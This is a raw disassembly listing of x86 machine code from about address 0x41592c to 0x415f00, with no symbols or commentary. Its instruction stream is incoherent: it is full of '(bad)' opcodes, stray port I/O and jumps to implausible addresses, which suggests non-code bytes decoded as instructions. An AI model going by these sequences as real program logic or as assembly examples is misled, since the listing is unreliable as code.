  41592c:	c4 51 9c             	les    -0x64(%ecx),%edx
  41592f:	b8 47 c5 c8 49       	mov    $0x49c8c547,%eax
  415934:	8b 81 31 8a b1 74    	mov    0x74b18a31(%ecx),%eax
  41593a:	c3                   	ret
  41593b:	75 09                	jne    0x415946
  41593d:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  41593e:	c9                   	leave
  41593f:	82 4e d4 fa          	orb    $0xfa,-0x2c(%esi)
  415943:	ab                   	stos   %eax,%es:(%edi)
  415944:	2a 34 83             	sub    (%ebx,%eax,4),%dh
  415947:	43                   	inc    %ebx
  415948:	2b 15 7b 42 0f 1b    	sub    0x1b0f427b,%edx
  41594e:	83 93 57 40 05 8a 23 	adcl   $0x23,-0x75fabfa9(%ebx)
  415955:	e8 70 e0 d0 eb       	call   0xec1239ca
  41595a:	e3 e7                	jecxz  0x415943
  41595c:	9b                   	fwait
  41595d:	68 87 8a 8f 5d       	push   $0x5d8f8a87
  415962:	fc                   	cld
  415963:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  415964:	74 04                	je     0x41596a
  415966:	b8 8e ba 1e 10       	mov    $0x101eba8e,%eax
  41596b:	b5 33                	mov    $0x33,%ch
  41596d:	f9                   	stc
  41596e:	0d 53 f1 6c 8b       	or     $0x8b6cf153,%eax
  415973:	65 0d 51 5c 87 47    	gs or  $0x47875c51,%eax
  415979:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  41597a:	0e                   	push   %cs
  41597b:	37                   	aaa
  41597c:	16                   	push   %ss
  41597d:	e5 d6                	in     $0xd6,%eax
  41597f:	9f                   	lahf
  415980:	7a 6f                	jp     0x4159f1
  415982:	7b af                	jnp    0x415933
  415984:	26 51                	es push %ecx
  415986:	00 42 47             	add    %al,0x47(%edx)
  415989:	53                   	push   %ebx
  41598a:	77 5a                	ja     0x4159e6
  41598c:	2a be 21 6c d8 bc    	sub    -0x432793df(%esi),%bh
  415992:	bb e8 6e 83 7e       	mov    $0x7e836ee8,%ebx
  415997:	71 be                	jno    0x415957
  415999:	10 05 65 40 04 55    	adc    %al,0x55044065
  41599f:	6a 0b                	push   $0xb
  4159a1:	05 1f 1c 7c 39       	add    $0x397c1c1f,%eax
  4159a6:	b9 20 70 b6 43       	mov    $0x43b67020,%ecx
  4159ab:	44                   	inc    %esp
  4159ac:	1d 1a 10 37 b3       	sbb    $0xb337101a,%eax
  4159b1:	66 00 59 ab          	data16 add %bl,-0x55(%ecx)
  4159b5:	9f                   	lahf
  4159b6:	e4 90                	in     $0x90,%al
  4159b8:	65 cc                	gs int3
  4159ba:	c3                   	ret
  4159bb:	22 f0                	and    %al,%dh
  4159bd:	50                   	push   %eax
  4159be:	38 94 00 46 9e f0 8b 	cmp    %dl,-0x740f61ba(%eax,%eax,1)
  4159c5:	c7 43 05 9e b3 37 01 	movl   $0x137b39e,0x5(%ebx)
  4159cc:	0b fb                	or     %ebx,%edi
  4159ce:	0d 75 ae 60 70       	or     $0x7060ae75,%eax
  4159d3:	8c b6 71 f7 66 2e    	mov    %?,0x2e66f771(%esi)
  4159d9:	05 b9 07 11 99       	add    $0x991107b9,%eax
  4159de:	f7 f9                	idiv   %ecx
  4159e0:	50                   	push   %eax
  4159e1:	f8                   	clc
  4159e2:	4b                   	dec    %ebx
  4159e3:	61                   	popa
  4159e4:	98                   	cwtl
  4159e5:	2c cb                	sub    $0xcb,%al
  4159e7:	06                   	push   %es
  4159e8:	ec                   	in     (%dx),%al
  4159e9:	80 e8 ba             	sub    $0xba,%al
  4159ec:	24 87                	and    $0x87,%al
  4159ee:	2d 60 31 70 ec       	sub    $0xec703160,%eax
  4159f3:	24 e8                	and    $0xe8,%al
  4159f5:	e4 b0                	in     $0xb0,%al
  4159f7:	01 59 9c             	add    %ebx,-0x64(%ecx)
  4159fa:	2a 72 e8             	sub    -0x18(%edx),%dh
  4159fd:	3b 27                	cmp    (%edi),%esp
  4159ff:	ab                   	stos   %eax,%es:(%edi)
  415a00:	8f 08 75 9c          	(bad)
  415a04:	03 5a 77             	add    0x77(%edx),%ebx
  415a07:	1f                   	pop    %ds
  415a08:	ac                   	lods   %ds:(%esi),%al
  415a09:	4e                   	dec    %esi
  415a0a:	55                   	push   %ebp
  415a0b:	a9 6c 6b 71 08       	test   $0x8716b6c,%eax
  415a10:	41                   	inc    %ecx
  415a11:	30 09                	xor    %cl,(%ecx)
  415a13:	1a eb                	sbb    %bl,%ch
  415a15:	dc db                	(bad)
  415a17:	db b1 83 4f 33 f6    	(bad) -0x9ccb07d(%ecx)
  415a1d:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  415a1e:	eb 06                	jmp    0x415a26
  415a20:	3e 07                	ds pop %es
  415a22:	74 1f                	je     0x415a43
  415a24:	4a                   	dec    %edx
  415a25:	3c 8b                	cmp    $0x8b,%al
  415a27:	6d                   	insl   (%dx),%es:(%edi)
  415a28:	40                   	inc    %eax
  415a29:	dd 9d b0 aa 00 9c    	fstpl  -0x63ff5550(%ebp)
  415a2f:	04 09                	add    $0x9,%al
  415a31:	66 07                	popw   %es
  415a33:	f4                   	hlt
  415a34:	c6                   	(bad)
  415a35:	62 08                	bound  %ecx,(%eax)
  415a37:	11 be 25 39 1f 82    	adc    %edi,-0x7de0c6db(%esi)
  415a3d:	d5 04                	aad    $0x4
  415a3f:	c3                   	ret
  415a40:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  415a41:	58                   	pop    %eax
  415a42:	05 78 e6 99 b0       	add    $0xb099e678,%eax
  415a47:	21 4b 2c             	and    %ecx,0x2c(%ebx)
  415a4a:	cc                   	int3
  415a4b:	32 04 33             	xor    (%ebx,%esi,1),%al
  415a4e:	98                   	cwtl
  415a4f:	ff a3 47 ae 16 5b    	jmp    *0x5b16ae47(%ebx)
  415a55:	e0 8b                	loopne 0x4159e2
  415a57:	fb                   	sti
  415a58:	5c                   	pop    %esp
  415a59:	f2 04 1e             	repnz add $0x1e,%al
  415a5c:	58                   	pop    %eax
  415a5d:	5b                   	pop    %ebx
  415a5e:	c9                   	leave
  415a5f:	c9                   	leave
  415a60:	2a ba 0c 78 75 c9    	sub    -0x368a87f4(%edx),%bh
  415a66:	d8 7b ef             	fdivrs -0x11(%ebx)
  415a69:	59                   	pop    %ecx
  415a6a:	76 b3                	jbe    0x415a1f
  415a6c:	77 76                	ja     0x415ae4
  415a6e:	af                   	scas   %es:(%edi),%eax
  415a6f:	ed                   	in     (%dx),%eax
  415a70:	8e f0                	mov    %eax,%?
  415a72:	28 f7                	sub    %dh,%bh
  415a74:	d3 b9 c4 13 ba 0b    	sarl   %cl,0xbba13c4(%ecx)
  415a7a:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  415a7b:	c2 c5 30             	ret    $0x30c5
  415a7e:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  415a7f:	1e                   	push   %ds
  415a80:	6a e0                	push   $0xffffffe0
  415a82:	b5 e0                	mov    $0xe0,%ch
  415a84:	80 62 6d f6          	andb   $0xf6,0x6d(%edx)
  415a88:	3b fd                	cmp    %ebp,%edi
  415a8a:	67 78 ec             	addr16 js 0x415a79
  415a8d:	6f                   	outsl  %ds:(%esi),(%dx)
  415a8e:	55                   	push   %ebp
  415a8f:	03 73 3c             	add    0x3c(%ebx),%esi
  415a92:	6a 04                	push   $0x4
  415a94:	56                   	push   %esi
  415a95:	2f                   	das
  415a96:	50                   	push   %eax
  415a97:	68 64 25 0a 88       	push   $0x880a2564
  415a9c:	51                   	push   %ecx
  415a9d:	f7 e1                	mul    %ecx
  415a9f:	60                   	pusha
  415aa0:	ba 98 b8 d0 8f       	mov    $0x8fd0b898,%edx
  415aa5:	c7                   	(bad)
  415aa6:	97                   	xchg   %eax,%edi
  415aa7:	b0 56                	mov    $0x56,%al
  415aa9:	0b b8 ec 9d f4 58    	or     0x58f49dec(%eax),%edi
  415aaf:	28 80 4c 36 e4 a0    	sub    %al,-0x5f1bc9b4(%eax)
  415ab5:	a9 b6 60 80 a3       	test   $0xa38060b6,%eax
  415aba:	36 5e                	ss pop %esi
  415abc:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  415abd:	d8 77 9d             	fdivs  -0x63(%edi)
  415ac0:	54                   	push   %esp
  415ac1:	32 ca                	xor    %dl,%cl
  415ac3:	31 87 18 f0 02 22    	xor    %eax,0x2202f018(%edi)
  415ac9:	0c f9                	or     $0xf9,%al
  415acb:	b9 8a 7a 2e 90       	mov    $0x902e7a8a,%ecx
  415ad0:	e6 65                	out    %al,$0x65
  415ad2:	93                   	xchg   %eax,%ebx
  415ad3:	c2 c5 a0             	ret    $0xa0c5
  415ad6:	7a 09                	jp     0x415ae1
  415ad8:	77 77                	ja     0x415b51
  415ada:	9f                   	lahf
  415adb:	25 c1 0f 82 3d       	and    $0x3d820fc1,%eax
  415ae0:	11 66 a1             	adc    %esp,-0x5f(%esi)
  415ae3:	ac                   	lods   %ds:(%esi),%al
  415ae4:	ae                   	scas   %es:(%edi),%al
  415ae5:	66 83 e8 19          	sub    $0x19,%ax
  415ae9:	15 bb e5 04 74       	adc    $0x7404e5bb,%eax
  415aee:	0d f3 08 02 72       	or     $0x720208f3,%eax
  415af3:	8d                   	lea    (bad),%edi
  415af4:	f8                   	clc
  415af5:	25 96 80 25 35       	and    $0x35258096,%eax
  415afa:	3a 8a 44 1e ff 2c    	cmp    0x2cff1e44(%edx),%cl
  415b00:	4a                   	dec    %edx
  415b01:	85 e8                	test   %ebp,%eax
  415b03:	17                   	pop    %ss
  415b04:	99                   	cltd
  415b05:	1a 2c 20             	sbb    (%eax,%eiz,1),%ch
  415b08:	74 16                	je     0x415b20
  415b0a:	64 e3 ac             	fs jecxz 0x415ab9
  415b0d:	04 f1                	add    $0xf1,%al
  415b0f:	d0 0e                	rorb   $1,(%esi)
  415b11:	82 a0 18 73 db 7d 90 	andb   $0x90,0x7ddb7318(%eax)
  415b18:	7a 26                	jp     0x415b40
  415b1a:	5c                   	pop    %esp
  415b1b:	43                   	inc    %ebx
  415b1c:	f6 3b                	idivb  (%ebx)
  415b1e:	d8 7e d2             	fdivrs -0x2e(%esi)
  415b21:	c2 6a 6b             	ret    $0x6b6a
  415b24:	17                   	pop    %ss
  415b25:	82 17 0b             	adcb   $0xb,(%edi)
  415b28:	52                   	push   %edx
  415b29:	ad                   	lods   %ds:(%esi),%eax
  415b2a:	0d 40 a4 0b f0       	or     $0xf00ba440,%eax
  415b2f:	87 69 0f             	xchg   %ebp,0xf(%ecx)
  415b32:	a3 05 d0 47 73       	mov    %eax,0x7347d005
  415b37:	24 20                	and    $0x20,%al
  415b39:	d4 83                	aam    $0x83
  415b3b:	e2 40                	loop   0x415b7d
  415b3d:	bc df 95 a2 d9       	mov    $0xd9a295df,%esp
  415b42:	e9 cb 1c 4c 0a       	jmp    0xa8d7812
  415b47:	13 31                	adc    (%ecx),%esi
  415b49:	d7                   	xlat   %ds:(%ebx)
  415b4a:	fd                   	std
  415b4b:	35 5c ba a4 bf       	xor    $0xbfa4ba5c,%eax
  415b50:	8d 3a                	lea    (%edx),%edi
  415b52:	28 e7                	sub    %ah,%bh
  415b54:	67 ee                	addr16 out %al,(%dx)
  415b56:	d6                   	salc
  415b57:	d4 04                	aam    $0x4
  415b59:	d3 0f                	rorl   %cl,(%edi)
  415b5b:	25 ba b0 18 77       	and    $0x7718b0ba,%eax
  415b60:	eb 9a                	jmp    0x415afc
  415b62:	01 39                	add    %edi,(%ecx)
  415b64:	ec                   	in     (%dx),%al
  415b65:	7e ba                	jle    0x415b21
  415b67:	b4 25                	mov    $0x25,%ah
  415b69:	04 11                	add    $0x11,%al
  415b6b:	c4 1c 61             	les    (%ecx,%eiz,2),%ebx
  415b6e:	ff 4d 50             	decl   0x50(%ebp)
  415b71:	03 eb                	add    %ebx,%ebp
  415b73:	56                   	push   %esi
  415b74:	ba cc 4d d8 ba       	mov    $0xbad84dcc,%edx
  415b79:	cb                   	lret
  415b7a:	63 97 30 ea 59 74    	arpl   %edx,0x7459ea30(%edi)
  415b80:	04 75                	add    $0x75,%al
  415b82:	0e                   	push   %cs
  415b83:	1a e4                	sbb    %ah,%ah
  415b85:	64 40                	fs inc %eax
  415b87:	ba 43 eb f8 f0       	mov    $0xf0f8eb43,%edx
  415b8c:	f0 21 51 86          	lock and %edx,-0x7a(%ecx)
  415b90:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  415b91:	0f 8e 16 ae 8e 58    	jle    0x58d009ad
  415b97:	49                   	dec    %ecx
  415b98:	b3 e7                	mov    $0xe7,%bl
  415b9a:	91                   	xchg   %eax,%ecx
  415b9b:	7a ba                	jp     0x415b57
  415b9d:	94                   	xchg   %eax,%esp
  415b9e:	36 ee                	ss out %al,(%dx)
  415ba0:	9d                   	popf
  415ba1:	f0 40                	lock inc %eax
  415ba3:	db 67 67             	(bad) 0x67(%edi)
  415ba6:	eb 03                	jmp    0x415bab
  415ba8:	0b 0c ee             	or     (%esi,%ebp,8),%ecx
  415bab:	0b 16                	or     (%esi),%edx
  415bad:	b8 79 00 4b 3f       	mov    $0x3f4b0079,%eax
  415bb2:	65 00 32             	add    %dh,%gs:(%edx)
  415bb5:	22 df                	and    %bh,%bl
  415bb7:	7b 0f                	jnp    0x415bc8
  415bb9:	15 13 02 1f 86       	adc    $0x861f0213,%eax
  415bbe:	68 28 de 1c e7       	push   $0xe71cde28
  415bc3:	2d 3d ab 1c 01       	sub    $0x11cab3d,%eax
  415bc8:	47                   	inc    %edi
  415bc9:	c3                   	ret
  415bca:	63 a8 fb f4 e0 06    	arpl   %ebp,0x6e0f4fb(%eax)
  415bd0:	1f                   	pop    %ds
  415bd1:	30 e0                	xor    %ah,%al
  415bd3:	1c 3d                	sbb    $0x3d,%al
  415bd5:	d0 fc                	sar    $1,%ah
  415bd7:	50                   	push   %eax
  415bd8:	ee                   	out    %al,(%dx)
  415bd9:	1f                   	pop    %ds
  415bda:	e0 89                	loopne 0x415b65
  415bdc:	4c                   	dec    %esp
  415bdd:	18 81 bd e0 0c 14    	sbb    %al,0x140ce0bd(%ecx)
  415be3:	9d                   	popf
  415be4:	14 3d                	adc    $0x3d,%al
  415be6:	67 1c 6b             	addr16 sbb $0x6b,%al
  415be9:	ee                   	out    %al,(%dx)
  415bea:	b0 66                	mov    $0x66,%al
  415bec:	c3                   	ret
  415bed:	fb                   	sti
  415bee:	bc 85 d4 24 1d       	mov    $0x1d24d485,%esp
  415bf3:	4c                   	dec    %esp
  415bf4:	c0 23 1b             	shlb   $0x1b,(%ebx)
  415bf7:	06                   	push   %es
  415bf8:	1c 12                	sbb    $0x12,%al
  415bfa:	30 fc                	xor    %bh,%ah
  415bfc:	4c                   	dec    %esp
  415bfd:	df bd 0b 98 3a 6a    	fistpll 0x6a3a980b(%ebp)
  415c03:	e4 04                	in     $0x4,%al
  415c05:	97                   	xchg   %eax,%edi
  415c06:	2b 9d 32 6c 55 cf    	sub    -0x30aa93ce(%ebp),%ebx
  415c0c:	1c c3                	sbb    $0xc3,%al
  415c0e:	26 b2 5c             	es mov $0x5c,%dl
  415c11:	5a                   	pop    %edx
  415c12:	75 09                	jne    0x415c1d
  415c14:	f7 c5 b6 42 0f f3    	test   $0xf30f42b6,%ebp
  415c1a:	8d 04 41             	lea    (%ecx,%eax,2),%eax
  415c1d:	42                   	inc    %edx
  415c1e:	c1 6b 11 fc          	shrl   $0xfc,0x11(%ebx)
  415c22:	d0 bb 74 7c fe 04    	sarb   $1,0x4fe7c74(%ebx)
  415c28:	75 ec                	jne    0x415c16
  415c2a:	0c d1                	or     $0xd1,%al
  415c2c:	9d                   	popf
  415c2d:	15 8b 16 1b 70       	adc    $0x701b168b,%eax
  415c32:	62 21                	bound  %esp,(%ecx)
  415c34:	ab                   	stos   %eax,%es:(%edi)
  415c35:	31 a0 04 81 2c d8    	xor    %esp,-0x27d37efc(%eax)
  415c3b:	09 dd                	or     %ebx,%ebp
  415c3d:	ee                   	out    %al,(%dx)
  415c3e:	c8 05 cd 64          	enter  $0xcd05,$0x64
  415c42:	03 ff                	add    %edi,%edi
  415c44:	2e d4 bf             	cs aam $0xbf
  415c47:	78 ba                	js     0x415c03
  415c49:	cf                   	iret
  415c4a:	f7 c0 31 25 87 fc    	test   $0xfc872531,%eax
  415c50:	1c f5                	sbb    $0xf5,%al
  415c52:	42                   	inc    %edx
  415c53:	40                   	inc    %eax
  415c54:	87 05 cd 02 8d a4    	xchg   %eax,0xa48d02cd
  415c5a:	4d                   	dec    %ebp
  415c5b:	76 0c                	jbe    0x415c69
  415c5d:	5e                   	pop    %esi
  415c5e:	83 40 30 f3          	addl   $0xfffffff3,0x30(%eax)
  415c62:	da 1a                	ficompl (%edx)
  415c64:	8c 2c af             	mov    %gs,(%edi,%ebp,4)
  415c67:	79 d9                	jns    0x415c42
  415c69:	be 0c 89 05 fc       	mov    $0xfc05890c,%esi
  415c6e:	c6 85 ac 04 90 33 d0 	movb   $0xd0,0x339004ac(%ebp)
  415c75:	8c 7c 12 b0          	mov    %?,-0x50(%edx,%edx,1)
  415c79:	b4 06                	mov    $0x6,%ah
  415c7b:	07                   	pop    %es
  415c7c:	0f 33                	rdpmc
  415c7e:	f6 66 64             	mulb   0x64(%esi)
  415c81:	b8 bc 05 89 9d       	mov    $0x9d8905bc,%eax
  415c86:	c0 1c c4 f6          	rcrb   $0xf6,(%esp,%eax,8)
  415c8a:	b9 33 f6 89 bd       	mov    $0xbd89f633,%ecx
  415c8f:	c8 0c cc 4f          	enter  $0xcc0c,$0x4f
  415c93:	7c 6a                	jl     0x415cff
  415c95:	45                   	inc    %ebp
  415c96:	ef                   	out    %eax,(%dx)
  415c97:	49                   	dec    %ecx
  415c98:	b8 de 8d 85 85       	mov    $0x85858dde,%eax
  415c9d:	5a                   	pop    %edx
  415c9e:	64 30 07             	xor    %al,%fs:(%edi)
  415ca1:	8d 0d 89 7a b3 44    	lea    0x44b37a89,%ecx
  415ca7:	00 2e                	add    %ch,(%esi)
  415ca9:	e8 05 66 c1 03       	call   0x402c2b3
  415cae:	84 c0                	test   %al,%al
  415cb0:	89 30                	mov    %esi,(%eax)
  415cb2:	f4                   	hlt
  415cb3:	87 2d a5 44 33 f0    	xchg   %ebp,0xf03344a5
  415cb9:	a1 c8 f4 5e b8       	mov    0xb85ef4c8,%eax
  415cbe:	9b                   	fwait
  415cbf:	58                   	pop    %eax
  415cc0:	a8 f5                	test   $0xf5,%al
  415cc2:	1a 45 40             	sbb    0x40(%ebp),%al
  415cc5:	a1 04 0d 1b 8a       	mov    0x8a1b0d04,%eax
  415cca:	24 14                	and    $0x14,%al
  415ccc:	8e 37                	mov    (%edi),%?
  415cce:	58                   	pop    %eax
  415ccf:	eb 0b                	jmp    0x415cdc
  415cd1:	e4 f6                	in     $0xf6,%al
  415cd3:	e0 36                	loopne 0x415d0b
  415cd5:	6a 40                	push   $0x40
  415cd7:	cd e8                	int    $0xe8
  415cd9:	e4 f3                	in     $0xf3,%al
  415cdb:	13 dd                	adc    %ebp,%ebx
  415cdd:	84 e0                	test   %ah,%al
  415cdf:	68 10 20 90 04       	push   $0x4902010
  415ce4:	48                   	dec    %eax
  415ce5:	86 26                	xchg   %ah,(%esi)
  415ce7:	81 db 3e 15 48 6d    	sbb    $0x6d48153e,%ebx
  415ced:	40                   	inc    %eax
  415cee:	68 3b 01 10 30       	push   $0x3010013b
  415cf3:	22 16                	and    (%esi),%dl
  415cf5:	71 23                	jno    0x415d1a
  415cf7:	48                   	dec    %eax
  415cf8:	8f                   	(bad)
  415cf9:	7c 8d                	jl     0x415c88
  415cfb:	47                   	inc    %edi
  415cfc:	04 92                	add    $0x92,%al
  415cfe:	ba 84 db 2c a0       	mov    $0xa02cdb84,%edx
  415d03:	91                   	xchg   %eax,%ecx
  415d04:	11 28                	adc    %ebp,(%eax)
  415d06:	cd c0                	int    $0xc0
  415d08:	02 9b 40 8f 40 17    	add    0x17408f40(%ebx),%bl
  415d0e:	0b 03                	or     (%ebx),%eax
  415d10:	f9                   	stc
  415d11:	2b 8a 7d 04 0c f2    	sub    -0xdf3fb83(%edx),%ecx
  415d17:	d7                   	xlat   %ds:(%ebx)
  415d18:	88 5a 24             	mov    %bl,0x24(%edx)
  415d1b:	01 49 74             	add    %ecx,0x74(%ecx)
  415d1e:	62 2b                	bound  %ebp,(%ebx)
  415d20:	39 59 31             	cmp    %ebx,0x31(%ecx)
  415d23:	60                   	pusha
  415d24:	da 91 7d 84 9d 58    	ficoml 0x589d847d(%ecx)
  415d2a:	61                   	popa
  415d2b:	7d 70                	jge    0x415d9d
  415d2d:	bb ab cc c4 3b       	mov    $0x3bc4ccab,%ebx
  415d32:	57                   	push   %edi
  415d33:	04 65                	add    $0x65,%al
  415d35:	97                   	xchg   %eax,%edi
  415d36:	bb c1 40 0e 64       	mov    $0x640e40c1,%ebx
  415d3b:	bd 58 7e 36 6b       	mov    $0x6b367e58,%ebp
  415d40:	0c 6b                	or     $0x6b,%al
  415d42:	11 54 05 ca          	adc    %edx,-0x36(%ebp,%eax,1)
  415d46:	c8 23 f9 e9          	enter  $0xf923,$0xe9
  415d4a:	14 5f                	adc    $0x5f,%al
  415d4c:	7e cd                	jle    0x415d1b
  415d4e:	f8                   	clc
  415d4f:	ba 02 e0 b3 08       	mov    $0x8b3e002,%edx
  415d54:	64 cd 3f             	fs int $0x3f
  415d57:	80 78 0c ee          	cmpb   $0xee,0xc(%eax)
  415d5b:	5a                   	pop    %edx
  415d5c:	1c a3                	sbb    $0xa3,%al
  415d5e:	f1                   	int1
  415d5f:	1a b4 fc 45 0e 09 54 	sbb    0x54090e45(%esp,%edi,8),%dh
  415d66:	85 01                	test   %eax,(%ecx)
  415d68:	fc                   	cld
  415d69:	2b b3 52 65 63 08    	sub    0x8636552(%ebx),%esi
  415d6f:	00 f4                	add    %dh,%ah
  415d71:	71 2c                	jno    0x415d9f
  415d73:	a0 27 33 db 05       	mov    0x5db3327,%al
  415d78:	94                   	xchg   %eax,%esp
  415d79:	bf 41 89 a2 b2       	mov    $0xb2a28941,%edi
  415d7e:	bc fe 06 7f 09       	mov    $0x97f06fe,%esp
  415d83:	3b 34 61             	cmp    (%ecx,%eiz,2),%esi
  415d86:	fe                   	(bad)
  415d87:	db c4                	fcmovnb %st(4),%st
  415d89:	dd b8 b5 75 f1 0d    	fnstsw 0xdf175b5(%eax)
  415d8f:	15 8b 0c dd bc       	adc    $0xbcdd0c8b,%eax
  415d94:	22 da                	and    %dl,%bl
  415d96:	9e                   	sahf
  415d97:	4b                   	dec    %ebx
  415d98:	b3 6c                	mov    $0x6c,%bl
  415d9a:	61                   	popa
  415d9b:	6c                   	insb   (%dx),%es:(%edi)
  415d9c:	28 1d 37 5a e1 d8    	sub    %bl,0xd8e15a37
  415da2:	8b c6                	mov    %esi,%eax
  415da4:	0e                   	push   %cs
  415da5:	9c                   	pushf
  415da6:	2f                   	das
  415da7:	0d e0 f8 46 35       	or     $0x3546f8e0,%eax
  415dac:	b0 f3                	mov    $0xf3,%al
  415dae:	1e                   	push   %ds
  415daf:	f1                   	int1
  415db0:	70 0c                	jo     0x415dbe
  415db2:	59                   	pop    %ecx
  415db3:	5a                   	pop    %edx
  415db4:	16                   	push   %ss
  415db5:	2b 76 47             	sub    0x47(%esi),%esi
  415db8:	1f                   	pop    %ds
  415db9:	10 7f 7f             	adc    %bh,0x7f(%edi)
  415dbc:	0a 54 d8 80          	or     -0x80(%eax,%ebx,8),%dl
  415dc0:	56                   	push   %esi
  415dc1:	6a c3                	push   $0xffffffc3
  415dc3:	00 53 28             	add    %dl,0x28(%ebx)
  415dc6:	d0 4a 6c             	rorb   $1,0x6c(%edx)
  415dc9:	02 ef                	add    %bh,%ch
  415dcb:	e0 02                	loopne 0x415dcf
  415dcd:	ff 0f                	decl   (%edi)
  415dcf:	4a                   	dec    %edx
  415dd0:	83 ea 16             	sub    $0x16,%edx
  415dd3:	72 10                	jb     0x415de5
  415dd5:	fa                   	cli
  415dd6:	a1 f4 1a eb 21       	mov    0x21eb1af4,%eax
  415ddb:	a1 f8 85 2f de       	mov    0xde2f85f8,%eax
  415de0:	78 06                	js     0x415de8
  415de2:	b2 04                	mov    $0x4,%dl
  415de4:	c5 d8 40             	(bad)
  415de7:	48                   	dec    %eax
  415de8:	8e f4                	mov    %esp,%?
  415dea:	f0 37                	lock aaa
  415dec:	73 62                	jae    0x415e50
  415dee:	7c db                	jl     0x415dcb
  415df0:	6e                   	outsb  %ds:(%esi),(%dx)
  415df1:	a8 53                	test   $0x53,%al
  415df3:	0f c8                	bswap  %eax
  415df5:	13 44 aa 26          	adc    0x26(%edx,%ebp,4),%eax
  415df9:	df cb                	(bad)
  415dfb:	35 90 93 15 5b       	xor    $0x5b159390,%eax
  415e00:	e0 02                	loopne 0x415e04
  415e02:	fc                   	cld
  415e03:	80 0c 80 c3          	orb    $0xc3,(%eax,%eax,4)
  415e07:	13 5b 51             	adc    0x51(%ebx),%ebx
  415e0a:	78 0c                	js     0x415e18
  415e0c:	ca d3 4b             	lret   $0x4bd3
  415e0f:	38 5d 88             	cmp    %bl,-0x78(%ebp)
  415e12:	85 45 0d             	test   %eax,0xd(%ebp)
  415e15:	98                   	cwtl
  415e16:	a1 bc 09 df e2       	mov    0xe2df09bc,%eax
  415e1b:	43                   	inc    %ebx
  415e1c:	75 8d                	jne    0x415dab
  415e1e:	a2 e4 c6 72 0b       	mov    %al,0xb72c6e4
  415e23:	89 75 ec             	mov    %esi,-0x14(%ebp)
  415e26:	a3 61 b9 6c 06       	mov    %eax,0x66cb961
  415e2b:	f0 7d f4             	lock jge 0x415e22
  415e2e:	f8                   	clc
  415e2f:	7f e4                	jg     0x415e15
  415e31:	ea 74 c5 e4 6d 02 2a 	ljmp   $0x2a02,$0x6de4c574
  415e38:	e0 a1                	loopne 0x415ddb
  415e3a:	e8 bc e0 1c 8c       	call   0x8c5e3efb
  415e3f:	37                   	aaa
  415e40:	b9 74 68 66 79       	mov    $0x79666874,%ecx
  415e45:	13 80 55 21 23 f2    	adc    -0xddcdeab(%eax),%eax
  415e4b:	e0 81                	loopne 0x415dce
  415e4d:	51                   	push   %ecx
  415e4e:	74 10                	je     0x415e60
  415e50:	28 86 83 89 cc bc    	sub    %al,-0x4333767d(%esi)
  415e56:	9b                   	fwait
  415e57:	11 db                	adc    %ebx,%ebx
  415e59:	62 6d 00             	bound  %ebp,0x0(%ebp)
  415e5c:	bb 3f 28 6f 6c       	mov    $0x6c6f283f,%ebx
  415e61:	8d 4d e2             	lea    -0x1e(%ebp),%ecx
  415e64:	59                   	pop    %ecx
  415e65:	2c 44                	sub    $0x44,%al
  415e67:	80 04 68 70          	addb   $0x70,(%eax,%ebp,2)
  415e6b:	18 11                	sbb    %dl,(%ecx)
  415e6d:	5a                   	pop    %edx
  415e6e:	3c cc                	cmp    $0xcc,%al
  415e70:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  415e71:	99                   	cltd
  415e72:	c0 69 67 23          	shrb   $0x23,0x67(%ecx)
  415e76:	d0 93 91 0b f8 d4    	rclb   $1,-0x2b07f46f(%ebx)
  415e7c:	68 3a e8 10 05       	push   $0x510e83a
  415e81:	57                   	push   %edi
  415e82:	38 69 47             	cmp    %ch,0x47(%ecx)
  415e85:	1c 8c                	sbb    $0x8c,%al
  415e87:	0c 32                	or     $0x32,%al
  415e89:	58                   	pop    %eax
  415e8a:	dd 59 53             	fstpl  0x53(%ecx)
  415e8d:	55                   	push   %ebp
  415e8e:	90                   	nop
  415e8f:	3f                   	aas
  415e90:	e4 8f                	in     $0x8f,%al
  415e92:	3c 48                	cmp    $0x48,%al
  415e94:	74 48                	je     0x415ede
  415e96:	eb 55                	jmp    0x415eed
  415e98:	33 74 37 eb          	xor    -0x15(%edi,%esi,1),%esi
  415e9c:	47                   	inc    %edi
  415e9d:	66 e4 67             	data16 in $0x67,%al
  415ea0:	64 35 28 16 eb 2f    	fs xor $0x2feb1628,%eax
  415ea6:	25 96 65 fb 85       	and    $0x85fb6596,%eax
  415eab:	1d 88 b0 03 c3       	sbb    $0xc303b088,%eax
  415eb0:	b0 04                	mov    $0x4,%al
  415eb2:	02 05 06 07 59 96    	add    0x96590706,%al
  415eb8:	65 59                	gs pop %ecx
  415eba:	08 09                	or     %cl,(%ecx)
  415ebc:	0b 0c 0d 41 7c 85 65 	or     0x65857c41(,%ecx,1),%ecx
  415ec3:	0e                   	push   %cs
  415ec4:	16                   	push   %ss
  415ec5:	83 b6 70 1e 06 13 62 	xorl   $0x62,0x13061e70(%esi)
  415ecc:	d9 b0 13 90 fe 19    	fnstenv 0x19fe9013(%eax)
  415ed2:	d9 5e 77             	fstps  0x77(%esi)
  415ed5:	c7 85 09 05 b4 ac c8 	movl   $0x19c287c8,-0x534bfaf7(%ebp)
  415edc:	87 c2 19 
  415edf:	b0 29                	mov    $0x29,%al
  415ee1:	a8 c3                	test   $0xc3,%al
  415ee3:	82 bc 45 e0 6a 31 eb 	cmpb   $0x83,-0x14ce9520(%ebp,%eax,2)
  415eea:	83 
  415eeb:	7b 14                	jnp    0x415f01
  415eed:	09 41 3e             	or     %eax,0x3e(%ecx)
  415ef0:	6c                   	insb   (%dx),%es:(%edi)
  415ef1:	7e 0f                	jle    0x415f02
  415ef3:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  415ef4:	28 f5                	sub    %dh,%ch
  415ef6:	b3 f9                	mov    $0xf9,%bl
  415ef8:	3b 38                	cmp    (%eax),%edi
  415efa:	c9                   	leave
  415efb:	b0 73                	mov    $0x73,%al
  415efd:	18 61 45             	sbb    %ah,0x45(%ecx)
  415f00:	e0 50                	loopne 0x415f52
